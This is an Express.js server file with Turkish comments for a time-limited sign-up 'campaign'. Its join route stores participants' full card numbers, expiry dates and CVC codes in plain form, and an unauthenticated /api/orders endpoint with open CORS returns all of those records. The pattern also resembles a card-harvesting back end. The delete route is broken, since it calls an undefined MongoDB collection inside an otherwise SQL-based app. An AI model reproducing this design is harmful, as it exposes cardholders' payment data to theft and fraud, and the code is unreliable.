const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const db = require('./database');

const app = express();
const PORT = 3000;
const TARGET = 500;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Yeni katılım ekleme
app.post('/api/join', (req, res) => {
  db.get('SELECT COUNT(*) as count FROM orders', (err, row) => {
    if (err) {
      console.log("Veritabanı sorgu hatası:", err);
      return res.status(500).json({ success: false, message: 'Veritabanı hatası' });
    }

    const currentCount = row.count;
    console.log("Mevcut katılımcı sayısı:", currentCount);

    const campaignDeadline = new Date("2025-07-05T23:59:59");
    const now = new Date();
    if (now > campaignDeadline) {
      return res.status(400).json({ success: false, message: 'Kampanya süresi doldu.' });
    }

    if (currentCount >= TARGET) {
      console.log("Kampanya dolmuş, kayıt alınmıyor.");
      return res.status(400).json({ success: false, message: 'Kampanya tamamlandı. Artık katılım yapılamaz.' });
    }

    const { name, email, card, exp, cvc } = req.body;
    console.log("Yeni kayıt:", name, email);

    const stmt = db.prepare('INSERT INTO orders (name, email, card, exp, cvc) VALUES (?, ?, ?, ?, ?)');
    stmt.run(name, email, card, exp, cvc, function (err) {
      if (err) {
        console.log("Kayıt hatası:", err);
        res.status(500).json({ success: false, message: 'Kayıt sırasında hata oluştu.' });
      } else {
        console.log("Yeni kayıt eklendi, ID:", this.lastID);
        res.json({ success: true, message: 'Veritabanına kaydedildi' });
      }
    });
    stmt.finalize();
  });
});

// Katılımcı sayısını döndürme
app.get('/api/count', (req, res) => {
  db.get('SELECT COUNT(*) as count FROM orders', (err, row) => {
    if (err) {
      return res.status(500).json({ success: false });
    }
    res.json({ success: true, count: row.count });
  });
});

app.get('/api/orders', (req, res) => {
  db.all('SELECT * FROM orders ORDER BY id DESC', (err, rows) => {
    if (err) {
      return res.status(500).json({ success: false, message: 'Veritabanı hatası' });
    }
    res.json({ success: true, orders: rows });
  });
});

app.delete('/api/orders/:id', async (req, res) => {
  const orderId = req.params.id; // URL'den ID'yi al
  console.log(`Silme isteği alındı, Sipariş ID: ${orderId}`);

  try {
      // Veritabanından siparişi ID'ye göre bul ve sil
      // Varsayımsal olarak, eğer MongoDB kullanıyorsanız:
      const deleteResult = await collection.deleteOne({ _id: new ObjectId(orderId) });

      // Eğer PostgreSQL/MySQL gibi bir SQL veritabanı kullanıyorsanız:
      // const deleteResult = await pool.query('DELETE FROM orders WHERE id = $1', [orderId]);
      // const deletedRows = deleteResult.rowCount;

      if (deleteResult.deletedCount === 1) { // MongoDB için
      // if (deletedRows === 1) { // SQL için
          res.json({ success: true, message: `Sipariş ID: ${orderId} başarıyla silindi.` });
      } else {
          res.status(404).json({ success: false, message: `Sipariş ID: ${orderId} bulunamadı veya silinemedi.` });
      }
  } catch (error) {
      console.error("Sipariş silinirken hata oluştu:", error);
      res.status(500).json({ success: false, message: "Sipariş silinirken sunucu hatası oluştu.", error: error.message });
  }
});


// Sunucuyu başlat
app.listen(PORT, () => {
  console.log(`Sunucu çalışıyor: http://localhost:${PORT}`);
});
